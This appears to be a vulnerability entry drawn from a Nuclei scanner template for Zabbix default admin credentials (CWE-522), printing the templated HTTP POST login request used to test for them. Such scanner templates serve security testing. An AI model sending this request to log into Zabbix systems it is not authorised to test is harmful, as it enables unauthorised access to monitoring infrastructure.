# Vulnerability: Zabbix Default Login
**Classification:** CWE-522
**Source:** Nuclei Template (`zabbix-default-login.yaml`)

## Description
Zabbix default admin credentials were discovered.

## Vulnerable Code Pattern / Exploit Payload
```http
POST {{path}} HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest

name={{username}}&password={{password}}&autologin=1&enter=Sign+in
```

